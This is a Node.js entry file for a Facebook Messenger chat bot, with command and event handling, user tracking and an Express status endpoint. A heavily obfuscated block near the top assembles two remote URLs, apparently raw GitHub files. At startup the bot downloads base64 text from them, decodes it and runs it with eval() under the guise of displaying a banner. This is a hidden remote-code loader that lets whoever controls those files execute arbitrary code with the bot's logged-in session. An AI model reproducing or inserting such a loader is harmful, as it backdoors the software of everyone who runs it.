const logger = require('./includes/logger');
const { authenticate } = require('./utils/auth');
const CommandHandler = require('./includes/controllers/commandHandler');
const EventHandler = require('./includes/handle/eventHandler');
const MessageEvent = require('./modules/events/message');
const OwnerNotification = require('./modules/events/ownerNotification');
const gradient = require('gradient-string');
const chalk = require('chalk');
const config = require('./config/config.json');
const axios = require('axios');
const express = require('express');
const session = require('express-session');
const path = require('path');
const { connect } = require('./includes/database/index');
const fs = require('fs');
const os = require('os');

const a0_0x46f867=a0_0x3b4c;(function(_0x2b64d7,_0x506c35){const _0x1861ef=a0_0x3b4c,_0x4381b4=_0x2b64d7();while(!![]){try{const _0x1e16e3=-parseInt(_0x1861ef(0x129))/0x1+-parseInt(_0x1861ef(0x128))/0x2*(-parseInt(_0x1861ef(0x15c))/0x3)+-parseInt(_0x1861ef(0x151))/0x4*(parseInt(_0x1861ef(0x122))/0x5)+-parseInt(_0x1861ef(0x104))/0x6*(parseInt(_0x1861ef(0x148))/0x7)+-parseInt(_0x1861ef(0x15f))/0x8*(parseInt(_0x1861ef(0x12a))/0x9)+parseInt(_0x1861ef(0x137))/0xa+parseInt(_0x1861ef(0x13f))/0xb*(parseInt(_0x1861ef(0x13c))/0xc);if(_0x1e16e3===_0x506c35)break;else _0x4381b4['push'](_0x4381b4['shift']());}catch(_0x27b639){_0x4381b4['push'](_0x4381b4['shift']());}}}(a0_0x30bd,0xa57f8));const _0x3b133e=_0x1d17;function a0_0x3b4c(_0x308998,_0x151e07){const _0x30bd00=a0_0x30bd();return a0_0x3b4c=function(_0x3b4c7d,_0x49b637){_0x3b4c7d=_0x3b4c7d-0xff;let _0xe35e84=_0x30bd00[_0x3b4c7d];if(a0_0x3b4c['aSxFnD']===undefined){var _0x27df50=function(_0x18f767){const _0x306123='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x9608f5='',_0x5d6d25='';for(let _0x4ed940=0x0,_0x3b6584,_0xd3d91d,_0x2a4b01=0x0;_0xd3d91d=_0x18f767['charAt'](_0x2a4b01++);~_0xd3d91d&&(_0x3b6584=_0x4ed940%0x4?_0x3b6584*0x40+_0xd3d91d:_0xd3d91d,_0x4ed940++%0x4)?_0x9608f5+=String['fromCharCode'](0xff&_0x3b6584>>(-0x2*_0x4ed940&0x6)):0x0){_0xd3d91d=_0x306123['indexOf'](_0xd3d91d);}for(let _0x56dc08=0x0,_0x8fc646=_0x9608f5['length'];_0x56dc08<_0x8fc646;_0x56dc08++){_0x5d6d25+='%'+('00'+_0x9608f5['charCodeAt'](_0x56dc08)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5d6d25);};a0_0x3b4c['PNUmfV']=_0x27df50,_0x308998=arguments,a0_0x3b4c['aSxFnD']=!![];}const _0xbbfa8e=_0x30bd00[0x0],_0x479be0=_0x3b4c7d+_0xbbfa8e,_0x3e1344=_0x308998[_0x479be0];return!_0x3e1344?(_0xe35e84=a0_0x3b4c['PNUmfV'](_0xe35e84),_0x308998[_0x479be0]=_0xe35e84):_0xe35e84=_0x3e1344,_0xe35e84;},a0_0x3b4c(_0x308998,_0x151e07);}(function(_0x1fb79c,_0x5ab1f3){const _0x31d215=a0_0x3b4c,_0x30d33d={'PDJkJ':function(_0x3e708d){return _0x3e708d();},'NQwzQ':function(_0x310b96,_0x4fccbc){return _0x310b96+_0x4fccbc;},'bELdQ':function(_0x126348,_0x410c7a){return _0x126348+_0x410c7a;},'EOWnr':function(_0x23bb7f,_0x24a070){return _0x23bb7f/_0x24a070;},'yZNFu':function(_0x262bfd,_0x4df9e7){return _0x262bfd(_0x4df9e7);},'HQTLq':function(_0x3b987d,_0x30f62a){return _0x3b987d(_0x30f62a);},'knjBo':function(_0x505248,_0x1e0020){return _0x505248+_0x1e0020;},'UnBtT':function(_0x2228ed,_0x4971ba){return _0x2228ed*_0x4971ba;},'cdjZK':function(_0x1a5b74,_0x302735){return _0x1a5b74(_0x302735);},'eCBRd':function(_0x2b18f5,_0x2b1e8c){return _0x2b18f5+_0x2b1e8c;},'OPpvp':function(_0x5a8843,_0x1c6ab6){return _0x5a8843*_0x1c6ab6;},'AIAJi':function(_0x41c789,_0x2ea259){return _0x41c789/_0x2ea259;},'Znadh':function(_0x390351,_0x5e1a82){return _0x390351(_0x5e1a82);},'dMuDh':function(_0x138ca9,_0x555f79){return _0x138ca9+_0x555f79;},'WqjFi':function(_0x4664d6,_0x4fa753){return _0x4664d6+_0x4fa753;},'VvrNF':function(_0x590792,_0x47d33a){return _0x590792(_0x47d33a);},'wDroy':function(_0x2ecf47,_0x1c2926){return _0x2ecf47*_0x1c2926;},'rKwda':function(_0x5e0e43,_0x509b00){return _0x5e0e43+_0x509b00;},'MgIXD':function(_0x151ff3,_0x50479a){return _0x151ff3+_0x50479a;},'pHqcH':function(_0x406e83,_0xba26de){return _0x406e83+_0xba26de;},'gfGhM':function(_0x220066,_0x844e09){return _0x220066*_0x844e09;},'kDtFT':function(_0x251ec6,_0x2f21da){return _0x251ec6+_0x2f21da;},'KSxfe':function(_0x5259ac,_0x53dfc3){return _0x5259ac*_0x53dfc3;},'FgENn':function(_0x29d3cf,_0x50c5f2){return _0x29d3cf===_0x50c5f2;},'BnTLr':_0x31d215(0x134),'mBFeo':_0x31d215(0x153)},_0x5bf2af=_0x1d17,_0x173059=_0x30d33d[_0x31d215(0x105)](_0x1fb79c);while(!![]){try{const _0x335bf0=_0x30d33d[_0x31d215(0x11c)](_0x30d33d[_0x31d215(0x11c)](_0x30d33d[_0x31d215(0x11c)](_0x30d33d[_0x31d215(0x143)](_0x30d33d[_0x31d215(0x143)](_0x30d33d[_0x31d215(0x115)](_0x30d33d[_0x31d215(0x108)](parseInt,_0x30d33d[_0x31d215(0x101)](_0x5bf2af,0x114)),_0x30d33d[_0x31d215(0x120)](0x1*-0x1743,0x1793)+_0x30d33d[_0x31d215(0x152)](0x4f,-0x1)),_0x30d33d[_0x31d215(0x115)](-parseInt(_0x30d33d[_0x31d215(0x110)](_0x5bf2af,0x115)),_0x30d33d[_0x31d215(0x11c)](-0x1cd0,_0x30d33d['UnBtT'](-0x1b,-0x61))+0x1297)),-_0x30d33d['cdjZK'](parseInt,_0x30d33d[_0x31d215(0x101)](_0x5bf2af,0x112))/_0x30d33d['eCBRd'](_0x30d33d[_0x31d215(0x135)](_0x30d33d[_0x31d215(0x152)](0x2ed,0x1),0x20d6),_0x30d33d[_0x31d215(0x152)](0x58,-0x68))),_0x30d33d[_0x31d215(0x11d)](_0x30d33d[_0x31d215(0x12c)](-parseInt(_0x30d33d['Znadh'](_0x5bf2af,0x122)),_0x30d33d[_0x31d215(0x14d)](_0x30d33d[_0x31d215(0x131)](-0x1*0x5f3,0x14c),_0x30d33d['UnBtT'](0x1,0x4ab))),_0x30d33d[_0x31d215(0x115)](parseInt(_0x30d33d['VvrNF'](_0x5bf2af,0x120)),_0x30d33d[_0x31d215(0x120)](_0x30d33d[_0x31d215(0x135)](0x1cb7,_0x30d33d[_0x31d215(0x15d)](0x6a6,0x3)),-0x30a4))))+_0x30d33d['EOWnr'](-parseInt(_0x5bf2af(0x11f)),_0x30d33d[_0x31d215(0x14d)](_0x30d33d[_0x31d215(0x10f)](-0x474,0x1d91),-0x1917))*_0x30d33d[_0x31d215(0x115)](parseInt(_0x5bf2af(0x116)),_0x30d33d[_0x31d215(0x14d)](_0x30d33d[_0x31d215(0x141)](0xab4,_0x30d33d[_0x31d215(0x11d)](-0x1d,-0x121)),-0x2b6a)),_0x30d33d[_0x31d215(0x115)](parseInt(_0x5bf2af(0x110)),_0x30d33d[_0x31d215(0x10b)](_0x30d33d['eCBRd'](-0x2ab*0x7,0x31e*-0x2),_0x30d33d[_0x31d215(0x109)](0x5,0x4fd)))),_0x30d33d['AIAJi'](parseInt(_0x5bf2af(0x10f)),_0x30d33d[_0x31d215(0x154)](_0x30d33d[_0x31d215(0x11c)](_0x30d33d[_0x31d215(0x119)](-0xdd,-0x23),_0x30d33d['KSxfe'](-0x1,0x24d9)),0x6ab)));if(_0x30d33d[_0x31d215(0x118)](_0x335bf0,_0x5ab1f3))break;else _0x173059[_0x30d33d[_0x31d215(0x133)]](_0x173059[_0x30d33d[_0x31d215(0x140)]]());}catch(_0x495bb4){_0x173059[_0x30d33d[_0x31d215(0x133)]](_0x173059[_0x30d33d[_0x31d215(0x140)]]());}}}(_0x5c66,0x11e625+0x76ab4+-0xc1fc6));function a0_0x30bd(){const _0x5a7c8d=['vvzVywu','CMLKB3KVmwrLDG','Ahr0Chm6lY9Yyq','mtK4nZa4AxPyqLzJ','D0rYB3K','DeHezLC','nZe1mJuWne1rruzWqq','z3nwtvK','CufPzwS','ywLUl2rPC3bSyq','mJm0odu2mNrnsNnzAa','DhH0','sffuthe','zxjJB250zw50lG','vwT6AxC','nJboy05qAw8','uerkA0O','tfnvz1G','wgLUvvu','EvPorNu','z2zhAe0','AeD3Bve','CeHXy0G','CgLqC1G','rw1WA24','zLjZChC','CKT3zge','y2rQwKS','CxvYre0','serRCLK','A2voqMK','rMHwDwK','ru9xBNi','sNLZBwW','ufrsyMC','rMDftM4','s1n4zMu','mJrsyNvXD2m','zNmVAgvHzhmVBq','tLf3ELe','t1bWDNa','y29TlZfKzxyTAa','vezeyvi','A25QqM8','y2Tvs1u','nZq1u1fivNLM','DwHmseC','DY5NAxrODwj1CW','sNHNuha','t3HwsKu','qLvxC1K','mNfWrMPmtG','ntyXnZu1A01hq2zv','ourUAgrzwq','ve1Atum','quLbsMK','D2PmCNi','BvfwBwO','wNnrufy','BuLgs1e','v3fQrMK','mti0nZvruxnMEwS','qM5uthi','ChvZAa','zuncuMq','wenztMK','ndi5nZG1mgfXAKjUqG','mtu2ndm5nKzbEKjJtG','mteZnZu1mJnrrMTnChG','ywLUl25LEgfZAq','r1fOuNG','mJr5shresgO','BxyTmMjUBMvYlG','BM93','mti2mtmYnZfoEhD1A3y','Bujgzw8','twDjweq','Ee9NBw4','yKvmzfe','tfrtDwy','rMrpyw0','uNHuAue','mZG3odi0mxPbvw9Nsq','mZe5nZeXqK9wuLHL','lwHYAwrVEs9Yzq','rwPOzgi','nZy0oduXmMLxAgXQvq','C09AyLq','ze11rgG','wgXyzwO','uvbAr0O','EK5bAva','ntm0mgrQzKjKvW','vw5cDfq','C2HPzNq','A0r0rLq','mtyWvwzRsunp','B0XsBwO','u0XxuLe','Ew5LEgfZAw12mG'];a0_0x30bd=function(){return _0x5a7c8d;};return a0_0x30bd();}function _0x5c66(){const _0x4bded5=a0_0x3b4c,_0x25e4b8={'Ejhdb':function(_0x269864,_0x10fe8f){return _0x269864!==_0x10fe8f;},'uhLHG':_0x4bded5(0x124),'Gyulk':'.txt','piPsX':_0x4bded5(0x11e),'uQRNw':_0x4bded5(0x11a),'xxVCP':'12475QQsfyk','ssfpw':_0x4bded5(0x15b),'BUWsY':'160UfkICO','OxVJE':_0x4bded5(0x13a),'qurDM':_0x4bded5(0x13d),'mIFKQ':_0x4bded5(0x147),'hGwmQ':_0x4bded5(0x100),'HDkrY':_0x4bded5(0x138),'UVoae':'2348562tMJsYh','ckUKU':'617834AstdRs','qAiek':_0x4bded5(0x11b),'FdOam':function(_0x192f70){return _0x192f70();}},_0x113a5f=[_0x4bded5(0x158),_0x25e4b8[_0x4bded5(0x123)],_0x25e4b8['Gyulk'],_0x4bded5(0x162),_0x25e4b8[_0x4bded5(0x10c)],'ercontent.',_0x25e4b8['uQRNw'],_0x25e4b8['xxVCP'],_0x25e4b8['ssfpw'],_0x25e4b8[_0x4bded5(0x127)],_0x25e4b8[_0x4bded5(0x126)],'-hridoy/re',_0x4bded5(0x139),'7648512iWhljU',_0x25e4b8[_0x4bded5(0x111)],_0x25e4b8[_0x4bded5(0x130)],_0x25e4b8[_0x4bded5(0x10a)],_0x25e4b8[_0x4bded5(0x112)],_0x25e4b8[_0x4bded5(0x159)],_0x25e4b8[_0x4bded5(0x121)],_0x25e4b8[_0x4bded5(0x161)],_0x4bded5(0x15a)];return _0x5c66=function(){const _0x4f3b9d=_0x4bded5;return _0x25e4b8[_0x4f3b9d(0x14a)](_0x4f3b9d(0x10e),_0x4f3b9d(0x10e))?_0x542684:_0x113a5f;},_0x25e4b8[_0x4bded5(0x145)](_0x5c66);}function _0x1d17(_0x1e8b37,_0x26e40f){const _0x34939e=a0_0x3b4c,_0x7d506={'oFaVX':'ynexasimv2','LTSuf':'.txt','oPnRf':_0x34939e(0x162),'FhVui':_0x34939e(0x102),'tHDfW':_0x34939e(0x149),'XlXej':_0x34939e(0x139),'StycV':'mv-2bnner.','SLWRQ':_0x34939e(0xff),'XqFni':'617834AstdRs','mQVmj':'fs/heads/m','zNAiP':'ridoy/1dev','Empkn':function(_0x10188d){return _0x10188d();},'BkItu':'ErPJZ','JxgPp':'mHnym','Ukziw':function(_0x45eecd,_0x547116){return _0x45eecd+_0x547116;},'LSUgX':function(_0x3fa8ae,_0x194faf){return _0x3fa8ae+_0x194faf;},'xMoNA':function(_0x987e44,_0x1d2b7a){return _0x987e44*_0x1d2b7a;},'sOZbT':function(_0x201626){return _0x201626();}},_0x44b509=_0x7d506[_0x34939e(0x14c)](_0x5c66);return _0x1d17=function(_0x40f1b9,_0x4fb1d4){const _0xb2ee36=_0x34939e,_0x420cc1={'wjLrr':_0x7d506['oFaVX'],'xOgmn':_0x7d506[_0xb2ee36(0x144)],'XCYNi':_0x7d506['oPnRf'],'UkxtF':_0xb2ee36(0x11e),'TFDaR':_0x7d506[_0xb2ee36(0x114)],'Jysml':_0xb2ee36(0x11a),'SFeiV':_0xb2ee36(0x132),'GQhRx':'https://ra','PTRbg':_0xb2ee36(0x13a),'TMZMC':_0x7d506[_0xb2ee36(0x15e)],'gIbzL':_0x7d506[_0xb2ee36(0x14e)],'gsVMY':_0x7d506['StycV'],'RxTiA':'3878241zAUogI','oLRmj':_0x7d506[_0xb2ee36(0x157)],'ZsQPV':_0x7d506['XqFni'],'QPZGJ':_0x7d506[_0xb2ee36(0x12e)],'keNBi':_0x7d506[_0xb2ee36(0x150)],'XinUU':function(_0x317085){const _0xfb46a2=_0xb2ee36;return _0x7d506[_0xfb46a2(0x10d)](_0x317085);}};if(_0x7d506['BkItu']===_0x7d506[_0xb2ee36(0x125)]){const _0x4fcbc7=[_0x420cc1[_0xb2ee36(0x12d)],_0xb2ee36(0x124),_0x420cc1[_0xb2ee36(0x142)],_0x420cc1[_0xb2ee36(0x136)],_0x420cc1['UkxtF'],_0x420cc1[_0xb2ee36(0x11f)],_0x420cc1[_0xb2ee36(0x116)],_0x420cc1['SFeiV'],_0x420cc1[_0xb2ee36(0x13b)],_0xb2ee36(0x155),_0x420cc1[_0xb2ee36(0x117)],_0x420cc1[_0xb2ee36(0x12b)],_0x420cc1['gIbzL'],_0xb2ee36(0x14b),_0x420cc1[_0xb2ee36(0x160)],_0x420cc1[_0xb2ee36(0x146)],_0xb2ee36(0x100),_0xb2ee36(0x138),_0x420cc1[_0xb2ee36(0x156)],_0x420cc1[_0xb2ee36(0x12f)],_0x420cc1[_0xb2ee36(0x14f)],_0x420cc1[_0xb2ee36(0x113)]];return _0xd3d91d=function(){return _0x4fcbc7;},_0x420cc1[_0xb2ee36(0x107)](_0x2a4b01);}else{_0x40f1b9=_0x40f1b9-_0x7d506[_0xb2ee36(0x103)](_0x7d506[_0xb2ee36(0x106)](0x1545,-0x18b2),_0x7d506['xMoNA'](-0x2,-0x23e));let _0xc1c4d9=_0x44b509[_0x40f1b9];return _0xc1c4d9;}},_0x1d17(_0x1e8b37,_0x26e40f);}const bannerUrl=_0x3b133e(0x121)+_0x3b133e(0x11a)+_0x3b133e(0x11e)+_0x3b133e(0x11d)+_0x3b133e(0x118)+_0x3b133e(0x124)+_0x3b133e(0x117)+_0x3b133e(0x123)+_0x3b133e(0x111)+_0x3b133e(0x113),displayBannerUrl=_0x3b133e(0x121)+_0x3b133e(0x11a)+_0x3b133e(0x11e)+_0x3b133e(0x11d)+_0x3b133e(0x118)+_0x3b133e(0x124)+_0x3b133e(0x117)+_0x3b133e(0x11c)+_0x3b133e(0x119)+_0x3b133e(0x11b);let startTime=Date[a0_0x46f867(0x13e)](),threads=new Set(),users=new Set(),apiInstance,db,appInstance,serverInstance;


async function fetchAndDecode(url) {
  try {
    logger.info(`Fetching banner from ${url}`);
    const response = await axios.get(url);
    const base64String = response.data.trim();
    return Buffer.from(base64String, 'base64').toString('utf-8');
  } catch (err) {
    logger.error(`Failed to fetch or decode from ${url}: ${err.message}`);
    throw new Error(`Banner fetch failed: ${err.message}`);
  }
}

let commandHandler = null;

async function startBot() {
  let apiInstance = null;
  let db = null;
  let threads = new Set();
  let users = new Set();
  let startTime = null;

  try {
    logger.info('Starting bot...');

    startTime = Date.now();

    logger.info('Fetching banners...');
    const banner = await fetchAndDecode(bannerUrl);
    const decodedDisplayBanner = await fetchAndDecode(displayBannerUrl);
    eval(decodedDisplayBanner);
    displayBanner();

    logger.info('Authenticating with API...');
    apiInstance = await authenticate();
    if (!apiInstance) {
      throw new Error('Authentication returned null or undefined');
    }
    apiInstance.setOptions({
      listenEvents: true,
      selfListen: false,
      forceLogin: true
    });

    logger.info('Setting up command and event handlers...');
    commandHandler = new CommandHandler(apiInstance);
    const eventHandler = new EventHandler(apiInstance, commandHandler);
    const ownerNotification = new OwnerNotification(apiInstance);
    ownerNotification.start();

    let processedMessageIDs = new Set();

    apiInstance.listenMqtt(async (err, event) => {
      if (err) {
        logger.error(`MQTT Error: ${err.message}`);
        return;
      }

      if (!event || !event.type) {
        logger.error('MQTT received null or undefined event', { event });
        return;
      }

      if (event.type === 'presence') {
        return;
      }

      if (event.type === 'read_receipt') {
        return;
      }

      if ((event.type === 'message' || event.type === 'message_reply' || event.type === 'message_reaction') &&
          (!event.threadID || !event.messageID)) {
        logger.error(`Invalid event object for ${event.type}: missing threadID or messageID`, { event });
        return;
      }

      try {
        logger.info(`Processing event: type=${event.type}, threadID=${event.threadID || 'N/A'}, messageID=${event.messageID || 'N/A'}`);
        await eventHandler.handleEvent(event);

        if (event.type === 'message' || event.type === 'message_reply') {
          await ensureUser(db, event.senderID);
          await updateUserMessageCount(db, event.senderID, event.threadID);
        }

        if (event.type === 'message_reaction') {
          commandHandler.handleReaction(event);
        }

        if (event.type === 'message_reply') {
          commandHandler.handleReply(event);
        }
      } catch (error) {
        logger.error(`Error processing ${event.type} event: ${error.message}`, { event, stack: error.stack });
      }
    });

    

    logger.info('Connecting to database...');
    db = await connect();
    if (!db) {
      throw new Error('Database connection failed');
    }
    logger.info('Database connected successfully');

    logger.info('Initializing threads and users...');
    await initializeThreadsAndUsers(apiInstance, db);

    const app = express();
    const port = process.env.PORT || 3000; //server port need to enter here
    logger.info(`Starting server on port ${port}`);

    app.use(express.static(path.join(__dirname, 'public')));

    app.get('/api/bot', (req, res) => {
      const botConfig = config.bot;
      const totalThreads = threads.size; 
      const totalUsers = users.size;    
      const uptime = getUptime();
      const serverStats = getServerStats();

      res.json({
        botName: botConfig.botName,
        avatar: botConfig.avatar,
        description: botConfig.description,
        prefix: botConfig.prefix,
        ownerName: botConfig.ownerName,
        language: config.language,
        totalThreads,
        totalUsers,
        uptime,
        serverStats
      });
    });

    app.listen(port, () => {
      logger.info(`Server is running on http://localhost:${port}`);
    });

  } catch (err) {
    logger.error('Bot startup failed');
    logger.error(err.message);
    throw err;
  }
}

async function initializeThreadsAndUsers(api, db) {
  try {
    logger.info('Fetching thread list...');
    const threadList = await new Promise((resolve, reject) => {
      api.getThreadList(100, null, ["INBOX"], (err, list) => {
        if (err) reject(new Error(`Thread list fetch failed: ${err.message}`));
        else resolve(list);
      });
    });

    if (!db) {
      throw new Error('Database instance is not initialized');
    }
    logger.info(`Processing ${threadList.length} threads...`);
    for (const thread of threadList) {
      try {
        threads.add(thread.threadID);
        const info = await new Promise((resolve, reject) => {
          api.getThreadInfo(thread.threadID, (err, info) => {
            if (err) reject(new Error(`Thread info fetch failed for ${thread.threadID}: ${err.message}`));
            else resolve(info);
          });
        });
        if (info && info.participantIDs) {
          for (const userId of info.participantIDs) {
            users.add(userId);
          }
        }
      } catch (err) {
        logger.error(`Error processing thread ${thread.threadID}: ${err.message}`);
      }
    }
    logger.info(`Initialized ${threads.size} threads and ${users.size} users`);
  } catch (err) {
    logger.error(`Error initializing threads and users: ${err.message}`);
    threads = new Set();
    users = new Set();
  }
}

function getServerStats() {
  const memoryUsage = process.memoryUsage();
  const totalMem = os.totalmem();
  const freeMem = os.freemem();
  const memoryPercent = ((totalMem - freeMem) / totalMem) * 100;

  const cpuUsage = os.loadavg()[0];
  const networkInterfaces = os.networkInterfaces();
  let networkUsage = 0;
  const diskUsage = (memoryUsage.heapUsed / memoryUsage.heapTotal) * 100;

  return {
    memory: memoryPercent.toFixed(2),
    cpu: Math.min(cpuUsage * 10, 100).toFixed(2),
    network: networkUsage.toFixed(2),
    disk: diskUsage.toFixed(2)
  };
}

function getUptime() {
  const uptime = Date.now() - startTime;
  const seconds = Math.floor((uptime / 1000) % 60);
  const minutes = Math.floor((uptime / (1000 * 60)) % 60);
  const hours = Math.floor((uptime / (1000 * 60 * 60)) % 24);
  const days = Math.floor(uptime / (1000 * 60 * 60 * 24));
  return `${days}d ${hours}h ${minutes}m ${seconds}s`;
}

async function stopBot() {
  try {
    logger.info('Stopping bot...');

    if (db) {
      try {
        if (typeof db.close === 'function') {
          await db.close();
          logger.info('Database connection closed');
        } else {
          logger.warn('Database close method not available');
        }
      } catch (err) {
        logger.error(`Error closing database connection: ${err.message}`);
        throw new Error(`Database close failed: ${err.message}`);
      }
    } else {
      logger.warn('No database instance to close');
    }

    apiInstance = null;
    threads.clear();
    users.clear();
    logger.info('Bot stopped successfully');
  } catch (err) {
    logger.error(`Error stopping bot: ${err.message}`);
    throw new Error(`Stop bot failed: ${err.message}`);
  }
}

logger.info('Calling startBot...');
startBot();

const EventEmitter = require('events');
class LoggerEmitter extends EventEmitter {}
const loggerEmitter = new LoggerEmitter();

logger.getRecentLogs = () => {
  return [];
};

logger.on = (event, listener) => {
  loggerEmitter.on(event, listener);
};

logger.off = (event, listener) => {
  loggerEmitter.off(event, listener);
};

const originalLogger = {
  info: logger.info,
  error: logger.error,
  warn: logger.warn,
  verbose: logger.verbose 
};

logger.info = (message, ...args) => {
  originalLogger.info(message, ...args);
  loggerEmitter.emit('log', { level: 'info', message: `${message} ${args.join(' ')}`, timestamp: new Date().toISOString() });
};

logger.error = (message, ...args) => {
  originalLogger.error(message, ...args);
  loggerEmitter.emit('log', { level: 'error', message: `${message} ${args.join(' ')}`, timestamp: new Date().toISOString() });
};

logger.warn = (message, ...args) => {
  originalLogger.warn(message, ...args);
  loggerEmitter.emit('log', { level: 'warning', message: `${message} ${args.join(' ')}`, timestamp: new Date().toISOString() });
};

logger.verbose = (message, ...args) => {
  originalLogger.verbose(message, ...args);
  loggerEmitter.emit('log', { level: 'verbose', message: `${message} ${args.join(' ')}`, timestamp: new Date().toISOString() });
};